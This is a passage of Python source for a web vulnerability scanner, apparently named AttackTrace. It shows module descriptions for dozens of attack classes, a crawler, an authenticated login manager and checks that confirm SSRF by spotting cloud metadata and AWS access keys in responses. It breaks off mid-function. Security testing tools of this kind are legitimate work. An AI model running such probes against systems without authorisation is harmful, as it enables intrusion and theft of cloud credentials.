"""
AttackTrace Advanced Attack Suite — Adaptive Intelligence Web Security Scanner.

Architecture:
  Layer 1: Crawler        — BFS link/form/API discovery, auth-aware
  Layer 2: Pattern Engine — 5700+ bug bounty report patterns (attack_patterns.py)
  Layer 3: AI Planner     — Claude fingerprints target, plans prioritised attack strategy
  Layer 4: 17 Modules     — Systematic testing of all discovered endpoints

Top vulnerability categories (from 5708 real bug bounty reports):
  IDOR (1854), CORS (1050), CSRF (660), Stored XSS (611),
  Privilege Escalation (276), GraphQL (175), Open Redirect (168),
  Account Takeover (167), Cache Poisoning (104), SSRF (79)
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import re
import time
import uuid
from datetime import datetime, timezone
from typing import Annotated, AsyncGenerator, Optional
from urllib.parse import urljoin, urlparse

import httpx
from fastapi import APIRouter, Depends, File, Form, HTTPException, UploadFile, status
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, field_validator

from uuid import UUID
from sqlalchemy.ext.asyncio import AsyncSession
from app.core.dependencies import get_current_user, get_current_org_id, require_tool
from app.core.config import get_settings
from app.core.database import get_db
from app.core.remediation import get_remediation
from app.models.db.user import User
from app.api.v1.dashboard import invalidate_dashboard_cache
from app.services.finding_ingest import ingest_findings
from app.services.waf_service import detect_waf, get_waf_bypass_payloads
from app.api.v1.attack_patterns import (
    CORS_ATTACK_ORIGINS, CORS_SENSITIVE_PATHS, CORS_WILDCARD_API_PATHS,
    CSRF_SENSITIVE_ACTIONS,
    XSS_PAYLOADS, XSS_TEST_PARAMS,
    SQLI_ERROR_PAYLOADS, SQLI_TIME_PAYLOADS, SQLI_ERROR_PATTERNS, SQLI_TEST_PARAMS,
    SQLI_REST_ENDPOINTS,
    SSRF_PARAMS, SSRF_TARGETS,
    IDOR_ID_PARAMS, IDOR_ENDPOINT_PATTERNS, IDOR_REST_PATHS,
    PRIV_ESC_PARAMS, PRIV_ESC_ADMIN_PATHS, MASS_ASSIGNMENT_ROLE_FIELDS,
    ATO_PASSWORD_RESET_TESTS, ATO_RESET_ENDPOINTS, ATO_EMAIL_CHANGE_ENDPOINTS,
    CACHE_POISON_HEADERS, CACHE_POISON_VALUES,
    RACE_CONDITION_ENDPOINTS,
    BUSINESS_LOGIC_TESTS,
    GRAPHQL_PATHS, GRAPHQL_INTROSPECTION, GRAPHQL_BATCH, GRAPHQL_AUTH_BYPASS_QUERIES,
    JWT_WEAK_SECRETS, JWT_KID_PAYLOADS,
    REDIRECT_PARAMS, REDIRECT_PAYLOADS,
    TECH_SIGNATURES, COMMON_SENSITIVE_PATHS,
    REST_API_PATHS, MONITORING_PATHS,
    # New patterns for expanded modules
    SSTI_PAYLOADS, SSTI_INDICATORS, SSTI_TEST_FIELDS,
    NOSQL_INJECTION_PAYLOADS, NOSQL_URL_PAYLOADS, NOSQL_REST_ENDPOINTS, NOSQL_SLEEP_PAYLOADS,
    XXE_PAYLOADS, XXE_INDICATORS,
    FILE_UPLOAD_PATHS,
    INFO_DISCLOSURE_PATHS, INFO_DISCLOSURE_INDICATORS,
    WEAK_CREDENTIAL_PAIRS,
    PROTOTYPE_POLLUTION_PAYLOADS,
    DOM_XSS_PAYLOADS,
    COUPON_CODES, BUSINESS_LOGIC_BASKET_ATTACKS,
    JWT_ALG_NONE_VARIANTS,
    SENSITIVE_AUTH_ENDPOINTS,
)

router = APIRouter(prefix="/attack-suite", tags=["AttackSuite"])
settings = get_settings()
_scan_history: dict[str, dict] = {}

MODULES_META = [
    {"id": "crawl",         "label": "Web Crawler",           "description": "BFS crawl to discover all endpoints, forms, and parameters before testing"},
    {"id": "headers",       "label": "Security Headers",       "description": "Missing/misconfigured HTTP security headers (CSP, HSTS, CORS, X-Frame-Options)"},
    {"id": "cors",          "label": "CORS Misconfiguration",  "description": "Reflected origin, null origin, subdomain bypass — #2 in bug bounty dataset (1050 reports)"},
    {"id": "csrf",          "label": "CSRF Bypass",            "description": "SameSite bypass, missing CSRF tokens, login CSRF — #3 in dataset (660 reports)"},
    {"id": "xss",           "label": "XSS Scanner",            "description": "Reflected & stored XSS in discovered forms and URL params — 611 stored XSS reports"},
    {"id": "sqli",          "label": "SQL Injection",          "description": "Time-based blind and error-based SQLi across all discovered parameters"},
    {"id": "ssrf",          "label": "SSRF Prober",            "description": "Cloud metadata, internal services — 79 SSRF + 18 blind SSRF reports"},
    {"id": "idor",          "label": "IDOR Scanner",           "description": "Cross-account access testing on crawled endpoints — #1 in dataset (1854 reports)"},
    {"id": "privilege",     "label": "Privilege Escalation",   "description": "Mass assignment, role tampering, admin paths — 276 reports"},
    {"id": "account",       "label": "Account Takeover",       "description": "Password reset host injection, email change, OAuth flow — 167 reports"},
    {"id": "cache",         "label": "Cache Poisoning",        "description": "Unkeyed header injection (X-Forwarded-Host, X-Host) — 104 reports"},
    {"id": "race",          "label": "Race Conditions",        "description": "Parallel request attacks on state-changing endpoints — 39 reports"},
    {"id": "business",      "label": "Business Logic",         "description": "Negative price, quantity overflow, coupon stacking — 51 reports"},
    {"id": "graphql",       "label": "GraphQL Inspector",      "description": "Introspection, batch abuse, auth bypass — 175 reports + top Amazon endpoint"},
    {"id": "jwt",           "label": "JWT Analyzer",           "description": "alg:none, weak secrets, kid injection, claims exposure — 60 reports"},
    {"id": "redirect",      "label": "Open Redirect",          "description": "OAuth redirect_uri, redirect param bypass — 168 reports, chains to ATO"},
    {"id": "auth_bypass",   "label": "Auth Bypass",            "description": "Admin paths, X-Forwarded-For, method override, sensitive file exposure"},
    {"id": "nosql",         "label": "NoSQL Injection",        "description": "MongoDB operator injection, NoSQL DoS, aggregation-based data extraction"},
    {"id": "ssti",          "label": "SSTI Detection",         "description": "Server-side template injection in Jinja2, Freemarker, Twig, SpEL, ERB"},
    {"id": "xxe",           "label": "XXE Injection",          "description": "XML External Entity attacks on XML-accepting endpoints and file upload"},
    {"id": "file_upload",   "label": "File Upload Bypass",     "description": "Extension bypass, null-byte, size limit, type restriction bypass"},
    {"id": "broken_auth",   "label": "Broken Authentication",  "description": "Weak/default credentials, password strength, brute-force protection"},
    {"id": "info_disclosure","label": "Information Disclosure", "description": "FTP directory, forgotten backups, .env files, Git exposure, log files"},
    {"id": "deserialization","label": "Insecure Deserialization","description": "Prototype pollution, zip bomb, XML billion laughs"},
    {"id": "rate_limit",  "label": "Rate Limit / Lockout",  "description": "Brute-force protection, account lockout, OTP rate limiting, password reset throttling"},
    {"id": "session",     "label": "Session Management",     "description": "Session fixation, concurrent sessions, cookie security flags (Secure/HttpOnly/SameSite), logout invalidation"},
    {"id": "http_method", "label": "HTTP Method Tampering",  "description": "PUT/DELETE/PATCH on GET-only endpoints, X-HTTP-Method-Override, verb tunneling through POST"},
    {"id": "2fa_bypass",  "label": "2FA/MFA Bypass",         "description": "OTP code reuse, null/empty code acceptance, response manipulation, backup code exposure"},
    {"id": "oauth",       "label": "OAuth Misconfiguration", "description": "Open redirect in callback, missing state parameter, implicit flow, PKCE bypass, token leakage"},
    # Hunt-skill additions
    {"id": "smuggling",   "label": "HTTP Request Smuggling", "description": "CL.TE, TE.CL, CL.0 desync detection — high-value target: Akamai/Cloudflare/Nginx reverse proxies"},
    {"id": "crlf",        "label": "CRLF Injection",         "description": "Response splitting → XSS past CSP script-src 'self', header injection, log poisoning vectors"},
    {"id": "hpp",         "label": "HTTP Parameter Pollution","description": "Duplicate params for ACL IDOR bypass ($13.5k confirmed), WAF bypass, PHP/ASP.NET/Node.js divergence"},
    {"id": "saml",        "label": "SAML Attacks",           "description": "Signature wrapping, attribute pollution, void canonicalization bypass — Critical ATO class"},
    {"id": "websocket",   "label": "WebSocket Security",     "description": "CSWSH (Cross-Site WebSocket Hijacking), missing Origin check, unauthenticated endpoint probe"},
    # New high-signal modules (principal engineer additions)
    {"id": "host_header",   "label": "Host Header Injection",   "description": "Password reset poisoning, cache deception, routing bypass via Host/X-Forwarded-Host manipulation"},
    {"id": "path_traversal","label": "Path Traversal / LFI",    "description": "Directory traversal (../), null-byte, double-encoding, Windows paths, PHP wrapper exploitation"},
    {"id": "oauth_advanced","label": "OAuth Advanced Attacks",   "description": "PKCE bypass, scope escalation, token leakage via referrer, implicit flow, authorization code interception"},
    {"id": "type_confusion","label": "JSON Type Confusion",      "description": "Array/object injection bypassing string checks, null coercion, integer vs string auth checks"},
    {"id": "api_versioning","label": "API Version Downgrade",    "description": "Older API versions with relaxed security, version enumeration via Accept/URL, auth bypass on legacy routes"},
]

# ── Models ────────────────────────────────────────────────────────────────────

class CrawlerConfig(BaseModel):
    enabled: bool = True
    max_depth: int = 3
    max_pages: int = 100
    respect_robots: bool = True

class LoginConfig(BaseModel):
    enabled: bool = False
    login_url: str = ""
    username: str = ""
    password: str = ""
    username_field: str = "username"    # field name for form/json login
    password_field: str = "password"
    login_type: str = "form"            # form | bearer | basic | cookie | rest_json
    bearer_token: str = ""
    cookie: str = ""
    # rest_json: path inside JSON response where the token lives
    # e.g. "authentication.token" for Juice Shop, "access_token" for OAuth
    token_path: str = "access_token"

class Account2Config(BaseModel):
    """Second account for IDOR testing (cross-account access)."""
    enabled: bool = False
    login_url: str = ""
    username: str = ""
    password: str = ""
    login_type: str = "rest_json"       # form | bearer | basic | cookie | rest_json
    token_path: str = "access_token"
    bearer_token: str = ""
    cookie: str = ""

class AttackSuiteRequest(BaseModel):
    target: str
    modules: list[str] = [m["id"] for m in MODULES_META]
    auth_headers: dict[str, str] = {}
    follow_redirects: bool = True
    timeout: int = 10
    crawler: CrawlerConfig = CrawlerConfig()
    login: LoginConfig = LoginConfig()
    account2: Account2Config = Account2Config()
    ai_analysis: bool = True          # Use Claude to plan strategy + analyse responses
    anthropic_api_key: Optional[str] = None  # Override key from frontend

    @field_validator("target")
    @classmethod
    def validate_target(cls, v: str) -> str:
        v = v.strip().rstrip("/")
        if not v:
            raise ValueError("Target is required")
        if re.search(r"[;&|`$(){}<>]", v):
            raise ValueError("Target contains invalid characters")
        if not v.startswith(("http://", "https://")):
            raise ValueError("Target must start with http:// or https://")
        return v

    @field_validator("timeout")
    @classmethod
    def validate_timeout(cls, v: int) -> int:
        return max(5, min(v, 60))


def _finding(module: str, test_name: str, severity: str, title: str,
             description: str, evidence: str, url: str, is_vulnerable: bool,
             remediation: str, confidence: str = "medium",
             oracle: Optional[str] = None) -> dict:
    """`oracle`, when passed, names *how* this specific call site actually
    confirmed the finding (see app.core.finding_confidence's taxonomy —
    "differential", "status-flip", "bare-signal", etc.). When set,
    _adapt_attack_suite_findings computes `confidence` server-side from it via
    grade_confidence(), overriding whatever literal string this call passed —
    the same false-positive-gate doctrine already enforced for the Attack
    Suite AI Agent's record_finding, now available here too. `oracle` is
    optional and most of this file's ~150 call sites don't pass one yet (a
    2026-09-15 audit found NONE did — every module hardcoded a bare
    confidence string with no server-side check at all); the literal
    `confidence` argument stays the fallback for call sites that haven't
    been migrated to report an oracle, so this is purely additive — nothing
    already passing a confidence string breaks."""
    return {
        "id": str(uuid.uuid4()),
        "module": module,
        "test_name": test_name,
        "severity": severity,
        "confidence": confidence,
        "oracle": oracle,
        "title": title,
        "description": description,
        "evidence": evidence,
        "url": url,
        "is_vulnerable": is_vulnerable,
        "remediation": remediation,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


from app.core.sse import sse_event as _sse


def _probe(module: str, method: str, url: str, *,
           payload: str = "", status: int | None = None,
           size: int | None = None, note: str = "") -> dict:
    """
    Yield this from a module to emit a verbose HTTP trace to the progress panel.
    The orchestrator routes dicts with __type__=='probe' to SSE 'progress' events.
    """
    parts = [f"  → {method} {url}"]
    if payload:
        p = payload if len(payload) <= 80 else payload[:77] + "..."
        parts.append(f"     payload: {p}")
    if status is not None:
        parts.append(f"     ← HTTP {status}" + (f"  ({size} bytes)" if size is not None else ""))
    if note:
        parts.append(f"     note: {note}")
    return {
        "__type__": "probe",
        "module": module,
        "message": "\n".join(parts),
    }


# ── Proof-based scanning helpers ──────────────────────────────────────────────

import html as _html_mod
import statistics as _statistics_mod

def _unique_canary() -> str:
    """Generate a unique 8-char hex canary for probe correlation."""
    import secrets
    return secrets.token_hex(4)


def _is_unescaped_in_html(payload: str, body: str) -> bool:
    """
    Return True ONLY if payload appears literally (unencoded) in body.
    Filters cases where the payload is HTML-entity-escaped (e.g. &lt;script&gt;),
    which means it is NOT executable — common source of XSS false positives.
    """
    if payload not in body:
        return False
    escaped = _html_mod.escape(payload)
    # If escape() doesn't change the payload, it has no special chars — safe to report
    if escaped == payload:
        return True
    # Payload has special chars. Make sure the RAW version actually appears
    # (not just the escaped version which could match a subset)
    return payload in body and escaped not in body.replace(payload, "")


def _extract_js_sinks_from_body(body: str) -> list[str]:
    """
    Extract variables assigned from user-controlled DOM sources in inline scripts.
    Returns list of variable names that could be tainted.
    Avoids flagging sinks in HTML body that are just framework templates.
    """
    import re
    sinks = []
    # Only look inside <script> blocks
    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
    dangerous_sinks = [
        "document.write(", "innerHTML =", "innerHTML=",
        "outerHTML =", "outerHTML=", "eval(",
        "location.href =", "location.href=",
        "location.assign(", "location.replace(",
        "setTimeout(", "setInterval(",
    ]
    source_patterns = [
        r"location\.search", r"location\.hash", r"location\.href",
        r"document\.referrer", r"window\.name", r"URLSearchParams",
    ]
    for block in script_blocks:
        for sink in dangerous_sinks:
            if sink in block:
                # Check if a user-controlled source also exists in the same block
                for src_pat in source_patterns:
                    if re.search(src_pat, block):
                        sinks.append(sink.strip())
                        break
    return list(set(sinks))


async def _timing_samples(client: httpx.AsyncClient, url: str, n: int = 3,
                           timeout: float = 8.0) -> tuple[float, float]:
    """
    Take N timing samples for a URL.
    Returns (mean_seconds, stdev_seconds).
    Falls back to (999.0, 0.0) on error.
    """
    samples = []
    for _ in range(n):
        try:
            t0 = time.monotonic()
            await client.get(url, timeout=timeout)
            samples.append(time.monotonic() - t0)
        except Exception:
            pass
        await asyncio.sleep(0.05)
    if not samples:
        return 999.0, 0.0
    mean = sum(samples) / len(samples)
    stdev = _statistics_mod.stdev(samples) if len(samples) > 1 else 0.5
    return mean, stdev


async def _response_baseline(client: httpx.AsyncClient, url: str) -> dict:
    """
    Capture a baseline response profile: status, body length, body hash.
    Used to compare against injected responses.
    """
    import hashlib
    try:
        r = await client.get(url, timeout=8)
        h = hashlib.md5(r.content).hexdigest()
        return {"status": r.status_code, "size": len(r.content), "hash": h, "ok": True}
    except Exception:
        return {"status": 0, "size": 0, "hash": "", "ok": False}


def _validate_ssrf_content(body: str, ssrf_url: str) -> bool:
    """
    Strict format-validation for SSRF responses.
    Checks for actual cloud-provider metadata JSON structure, not just keywords.
    """
    body_lower = body.lower()
    if "169.254.169.254" in ssrf_url or "metadata.google" in ssrf_url:
        # AWS IMDSv1: valid response has JSON with InstanceId, AccountId
        import re
        if re.search(r'"instanceid"\s*:\s*"i-[0-9a-f]+', body_lower):
            return True
        if re.search(r'"accountid"\s*:\s*"\d{12}"', body_lower):
            return True
        # GCP: metadata-flavor header + instance/zone JSON
        if re.search(r'"project-id"\s*:\s*"[a-z0-9-]+"', body_lower):
            return True
        # Azure: response contains compute/subscriptionId
        if re.search(r'"subscriptionid"\s*:\s*"[0-9a-f-]{36}"', body_lower):
            return True
        # Any AccessKeyId-style content (AWS credentials)
        if re.search(r'AKIA[0-9A-Z]{16}', body):
            return True
        # Plaintext IMDSv1 endpoint (169.254.169.254/latest/meta-data)
        if all(kw in body_lower for kw in ["ami-id", "instance-type"]):
            return True
    if "100.100.100.200" in ssrf_url:  # Alibaba Cloud
        if re.search(r'"instance-id"\s*:', body_lower):
            return True
    return False


def _responses_meaningfully_differ(r1_body: str, r2_body: str,
                                    size1: int, size2: int) -> bool:
    """
    Returns True if two responses appear to contain different data.
    Used for IDOR detection to avoid flagging identical-content responses.
    """
    # Size must differ by >20% and >100 bytes to be meaningful
    if max(size1, size2) == 0:
        return False
    size_diff_ratio = abs(size1 - size2) / max(size1, size2)
    if size_diff_ratio > 0.2 and abs(size1 - size2) > 100:
        return True
    # Or first 500 chars of body meaningfully differ
    s1 = r1_body[:500].strip()
    s2 = r2_body[:500].strip()
    if s1 and s2 and s1 != s2 and len(s1) > 20 and len(s2) > 20:
        return True
    return False


def _idor_nonexistent_url(ep: str) -> Optional[str]:
    """Same numeric-ID -> 999999 substitution used by the sequential-ID IDOR
    check, extracted so the cross-account check can build its own not-found
    baseline URL too. Returns None if `ep` has no numeric path segment to
    substitute (nothing to build a baseline from)."""
    substituted = re.sub(r'/(\d+)(?=[/?]|$)', '/999999', ep)
    return substituted if substituted != ep else None


# ── Crawler ───────────────────────────────────────────────────────────────────

class CrawlResult:
    def __init__(self):
        self.pages: list[dict] = []          # {url, status, headers, body_snippet}
        self.forms: list[dict] = []          # {url, action, method, inputs}
        self.endpoints: set[str] = set()     # all discovered URLs
        self.params: dict[str, set] = {}     # url -> set of parameter names
        self.tech_stack: list[str] = []
        self.ids_found: list[str] = []       # numeric/UUID IDs in URLs


async def _crawl(target: str, client: httpx.AsyncClient,
                 cfg: CrawlerConfig) -> CrawlResult:
    result = CrawlResult()
    visited: set[str] = set()
    queue: list[tuple[str, int]] = [(target, 0)]
    parsed_base = urlparse(target)

    while queue and len(visited) < cfg.max_pages:
        url, depth = queue.pop(0)
        if url in visited or depth > cfg.max_depth:
            continue
        visited.add(url)

        try:
            r = await client.get(url, timeout=8, follow_redirects=True)
        except httpx.HTTPError:
            continue

        result.endpoints.add(url)
        body = r.text[:50000]

        result.pages.append({
            "url": url,
            "status": r.status_code,
            "content_type": r.headers.get("content-type", ""),
            "headers": dict(r.headers),
            "body_snippet": body[:500],
        })

        # Fingerprint tech stack
        _fingerprint(r, result)

        # Extract IDs from URL
        for id_val in re.findall(r'/(\d{3,}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', url):
            result.ids_found.append(id_val)

        # Only crawl HTML pages
        ct = r.headers.get("content-type", "")
        if "text/html" not in ct:
            continue

        # Extract links
        for href in re.findall(r'href=["\']([^"\'#]+)["\']', body):
            abs_url = urljoin(url, href).split("?")[0].split("#")[0]
            parsed = urlparse(abs_url)
            if parsed.netloc == parsed_base.netloc and abs_url not in visited:
                queue.append((abs_url, depth + 1))

        # Extract forms
        for form_match in re.finditer(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
            body, re.DOTALL | re.IGNORECASE
        ):
            action, method, form_body = form_match.groups()
            abs_action = urljoin(url, action) if action else url
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*/?>',
                                form_body, re.IGNORECASE)
            textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']',
                                   form_body, re.IGNORECASE)
            result.forms.append({
                "source_url": url,
                "action": abs_action,
                "method": method.upper() or "GET",
                "inputs": inputs + textareas,
            })

        # Extract JS API calls
        for api_path in re.findall(r'["\'](/api/[\w/\-_.{}?=&%]+)["\']', body):
            abs_api = urljoin(target, api_path)
            if urlparse(abs_api).netloc == parsed_base.netloc:
                result.endpoints.add(abs_api)

        await asyncio.sleep(0)

    return result


def _fingerprint(r: httpx.Response, result: CrawlResult) -> None:
    headers_str = str(dict(r.headers)).lower()
    body_lower = r.text[:5000].lower()
    server = r.headers.get("server", "").lower()
    powered_by = r.headers.get("x-powered-by", "").lower()

    for tech, sig in TECH_SIGNATURES.items():
        for signal in sig["signals"]:
            if signal.lower() in headers_str or signal.lower() in body_lower:
                if tech not in result.tech_stack:
                    result.tech_stack.append(tech)
                break


# ── SPA Detection ────────────────────────────────────────────────────────────

async def _detect_spa_fallback(target: str, client: httpx.AsyncClient) -> int:
    """
    Detect if target is a SPA with catch-all routing.

    Many SPAs (Angular, React, Vue) return index.html for every unknown path.
    This causes massive false positives for path-based tests (sensitive files,
    admin paths, account takeover endpoints) because every path returns HTTP 200.

    Strategy: request two random nonexistent paths. If both return 200 with the
    same content length as the root page, the server is serving a SPA fallback.

    Returns the fallback content length if SPA detected, else 0.
    """
    try:
        canary1 = f"{target}/__attacktrace_{uuid.uuid4().hex[:8]}__"
        canary2 = f"{target}/nonexistent_{uuid.uuid4().hex[:8]}/path"
        r0, r1, r2 = await asyncio.gather(
            client.get(target, timeout=8),
            client.get(canary1, timeout=8),
            client.get(canary2, timeout=8),
            return_exceptions=True,
        )
        if isinstance(r0, Exception) or isinstance(r1, Exception) or isinstance(r2, Exception):
            return 0
        # SPA: all three return 200 and same content length
        if (r1.status_code == 200 and r2.status_code == 200
                and abs(len(r1.content) - len(r0.content)) < 200
                and abs(len(r2.content) - len(r0.content)) < 200):
            return len(r1.content)
    except Exception:
        pass
    return 0


def _is_spa_fallback(response: httpx.Response, fallback_size: int) -> bool:
    """Returns True if this response looks like the SPA fallback page."""
    if fallback_size <= 0:
        return False
    return abs(len(response.content) - fallback_size) < 200


# ── Login Manager ─────────────────────────────────────────────────────────────

async def _perform_login(
    client: httpx.AsyncClient,
    cfg: LoginConfig,
    target: str,
) -> dict:
    """
    Properly authenticate against the target and return session credentials.

    Returns a dict with one of:
      {"Authorization": "Bearer <token>"}              — JWT/bearer token
      {"__cookies__": {name: value, ...},              — session cookies
       "__cookie_header__": "name=val; name2=val2",
       "__login_debug__": [...]}                       — debug trace
      {}                                               — login failed

    Form login flow:
      1. GET the login URL (follow redirects to reach the real login page)
      2. Parse ALL <form> elements — find the one with a password field
      3. Resolve the form's action URL (relative → absolute)
      4. Collect ALL hidden input fields (CSRF tokens, nonce, _method, etc.)
      5. Override the username/password fields with user-supplied values
      6. POST to the form action URL
      7. Validate success: landed on a different URL or got new session cookies
    """
    debug: list[str] = []

    if not cfg.enabled:
        return {}

    if cfg.login_type == "bearer":
        debug.append("Mode: bearer token")
        return {"Authorization": f"Bearer {cfg.bearer_token}"}

    if cfg.login_type == "basic":
        debug.append("Mode: HTTP Basic Auth")
        creds = base64.b64encode(f"{cfg.username}:{cfg.password}".encode()).decode()
        return {"Authorization": f"Basic {creds}"}

    if cfg.login_type == "cookie":
        debug.append("Mode: pre-supplied cookie string")
        return {"Cookie": cfg.cookie}

    # ── REST JSON login ──────────────────────────────────────────────────────
    if cfg.login_type == "rest_json":
        login_url = cfg.login_url.strip() or f"{target}/api/login"
        debug.append(f"Mode: REST JSON POST → {login_url}")
        try:
            body = {cfg.username_field: cfg.username, cfg.password_field: cfg.password}
            debug.append(f"Fields: {list(body.keys())}")
            lr = await client.post(
                login_url, json=body,
                headers={"Content-Type": "application/json", "Accept": "application/json"},
                timeout=12, follow_redirects=True,
            )
            debug.append(f"Response: HTTP {lr.status_code}")
            if lr.status_code < 400:
                # 1. Dot-path traversal (e.g. "authentication.token")
                try:
                    data = lr.json()
                    token: object = data
                    for part in cfg.token_path.split("."):
                        if isinstance(token, dict):
                            token = token.get(part)
                        else:
                            token = None
                            break
                    if token and isinstance(token, str):
                        debug.append(f"Token found at path '{cfg.token_path}'")
                        return {"Authorization": f"Bearer {token}", "__login_debug__": debug}
                    # 2. Scan common token keys
                    for key in ["access_token", "token", "accessToken", "jwt",
                                "id_token", "auth_token", "idToken", "sessionToken"]:
                        if isinstance(data, dict) and key in data and isinstance(data[key], str):
                            debug.append(f"Token found in key '{key}'")
                            return {"Authorization": f"Bearer {data[key]}", "__login_debug__": debug}
                    # 3. Nested: data.data.token etc.
                    if isinstance(data, dict):
                        for nested_key in ["data", "result", "user", "auth"]:
                            if nested_key in data and isinstance(data[nested_key], dict):
                                inner = data[nested_key]
                                for key in ["access_token", "token", "jwt", "id_token"]:
                                    if key in inner and isinstance(inner[key], str):
                                        debug.append(f"Token found at {nested_key}.{key}")
                                        return {"Authorization": f"Bearer {inner[key]}", "__login_debug__": debug}
                except Exception as ex:
                    debug.append(f"JSON parse error: {ex}")
            # 4. Session cookies from REST login (some APIs use cookies)
            cookies = dict(client.cookies)
            if cookies:
                debug.append(f"REST login returned cookies: {list(cookies.keys())}")
                return {"__cookies__": cookies, "__cookie_header__": _cookies_to_header(cookies),
                        "__login_debug__": debug}
            debug.append(f"REST JSON login: no token or cookie in response (HTTP {lr.status_code})")
        except httpx.HTTPError as ex:
            debug.append(f"REST JSON login HTTP error: {ex}")
        return {"__login_debug__": debug}

    # ── HTML Form login ──────────────────────────────────────────────────────
    if cfg.login_type == "form":
        login_url = cfg.login_url.strip() or f"{target}/login"
        debug.append(f"Mode: HTML form POST")
        debug.append(f"Login URL: {login_url}")

        # Step 1: GET the login page (follow redirects — some sites /login → /auth/login)
        try:
            page_r = await client.get(login_url, timeout=12, follow_redirects=True)
        except httpx.HTTPError as ex:
            return {"__login_debug__": [f"Cannot GET login page: {ex}"]}

        actual_login_url = str(page_r.url)
        debug.append(f"Login page final URL: {actual_login_url}")
        debug.append(f"Login page status: HTTP {page_r.status_code}")

        # Step 2: Parse ALL <form> elements — find the one with a password field
        html = page_r.text
        form_action = actual_login_url
        form_data: dict[str, str] = {}
        form_found = False

        # Extract each <form ...>...</form> block
        form_blocks = list(re.finditer(
            r'<form\b([^>]*)>(.*?)</form>',
            html, re.DOTALL | re.IGNORECASE
        ))
        debug.append(f"Forms found on page: {len(form_blocks)}")

        for form_match in form_blocks:
            form_attrs_str = form_match.group(1)
            form_body = form_match.group(2)

            # Only process forms with a password-type input
            has_password = re.search(
                r'<input\b[^>]*type=["\']password["\']', form_body, re.IGNORECASE
            )
            if not has_password:
                continue

            form_found = True
            debug.append("Found login form (has password field)")

            # Resolve form action
            action_m = re.search(r'\baction=["\']([^"\']+)["\']', form_attrs_str, re.IGNORECASE)
            if action_m:
                raw_action = action_m.group(1).strip()
                from urllib.parse import urljoin
                form_action = urljoin(actual_login_url, raw_action)
            else:
                form_action = actual_login_url
            debug.append(f"Form action URL: {form_action}")

            # Step 3: Collect ALL input fields from this form
            for input_m in re.finditer(r'<input\b([^>]*)>', form_body, re.IGNORECASE):
                attrs = input_m.group(1)

                # Extract name (both quoted and unquoted)
                name_m = re.search(r'\bname=["\']?([^"\'>\s]+)["\']?', attrs, re.IGNORECASE)
                if not name_m:
                    continue
                field_name = name_m.group(1)

                # Extract value (handle both quoted forms and empty)
                value_m = re.search(r'\bvalue=["\']([^"\']*)["\']', attrs, re.IGNORECASE)
                field_value = value_m.group(1) if value_m else ""

                # Extract type
                type_m = re.search(r'\btype=["\']?([^"\'>\s]+)["\']?', attrs, re.IGNORECASE)
                field_type = type_m.group(1).lower() if type_m else "text"

                if field_type == "submit":
                    continue  # skip submit buttons

                # Identify if this is the username/password field
                field_lower = field_name.lower()
                is_user_field = (
                    field_name == cfg.username_field
                    or field_lower in ("email", "login", "user", "username",
                                       "user_login", "userlogin", "userid", "user_id",
                                       "email_address", "emailaddress")
                    or (field_type in ("email", "text") and
                        any(kw in field_lower for kw in ["user", "email", "login", "name"]))
                )
                is_pass_field = (
                    field_name == cfg.password_field
                    or field_lower in ("password", "pass", "passwd", "secret", "pwd")
                    or field_type == "password"
                )

                if is_user_field:
                    form_data[field_name] = cfg.username
                    debug.append(f"Username → field '{field_name}' = '{cfg.username}'")
                elif is_pass_field:
                    form_data[field_name] = cfg.password
                    debug.append(f"Password → field '{field_name}' (hidden)")
                else:
                    # Include all other fields (hidden CSRF tokens, next URL, etc.)
                    form_data[field_name] = field_value
                    if field_value:
                        debug.append(f"Hidden field: '{field_name}' = '{field_value[:40]}'")

            # Also collect <textarea> and <select> elements as hidden data
            for sel_m in re.finditer(r'<select\b([^>]*)>.*?</select>', form_body,
                                     re.DOTALL | re.IGNORECASE):
                name_m = re.search(r'\bname=["\']?([^"\'>\s]+)', sel_m.group(1))
                if name_m and name_m.group(1) not in form_data:
                    form_data[name_m.group(1)] = ""

            break  # Use first form with password field

        if not form_found:
            debug.append("WARNING: No form with password field found on login page. "
                         "Attempting direct POST with supplied field names.")
            form_data = {cfg.username_field: cfg.username, cfg.password_field: cfg.password}

        # Always ensure username and password are set (may override detected fields)
        form_data[cfg.username_field] = cfg.username
        form_data[cfg.password_field] = cfg.password

        debug.append(f"POST to: {form_action}")
        debug.append(f"Form fields: {[k for k in form_data if k not in (cfg.password_field, 'password', 'pass', 'passwd')]}")

        # Step 4: POST the login form
        try:
            lr = await client.post(
                form_action, data=form_data, timeout=12, follow_redirects=True,
            )
        except httpx.HTTPError as ex:
            return {"__login_debug__": debug + [f"Login POST failed: {ex}"]}

        post_final_url = str(lr.url)
        debug.append(f"POST response: HTTP {lr.status_code}")
        debug.append(f"Final URL after POST: {post_final_url}")

        # Step 5: Check for success

        # CRITICAL FIX: use client.cookies (accumulates across ALL redirects),
        # NOT lr.cookies (only the last response's Set-Cookie headers).
        all_cookies = dict(client.cookies)
        debug.append(f"Session cookies after login: {list(all_cookies.keys()) or 'none'}")

        # Success signal 1: we have session cookies
        if all_cookies:
            # Verify we're not still on the login page (login failed silently)
            still_on_login = (
                post_final_url.rstrip("/") == login_url.rstrip("/")
                or post_final_url.rstrip("/") == actual_login_url.rstrip("/")
            )
            if still_on_login:
                # Could be a login error page — check for error indicators
                error_signals = re.search(
                    r'(invalid|incorrect|wrong|failed|error|unauthorized|credentials)',
                    lr.text[:3000], re.IGNORECASE
                )
                if error_signals:
                    debug.append(f"WARNING: Redirected back to login page with error signal "
                                 f"'{error_signals.group(1)}'. Login may have failed.")
                    return {"__login_debug__": debug}
            debug.append("Login SUCCESS — session cookies captured")
            return {
                "__cookies__": all_cookies,
                "__cookie_header__": _cookies_to_header(all_cookies),
                "__login_debug__": debug,
            }

        # Success signal 2: JWT / token in response body
        try:
            data = lr.json()
            for key in ["access_token", "token", "accessToken", "jwt", "id_token", "auth_token"]:
                if key in data and isinstance(data[key], str):
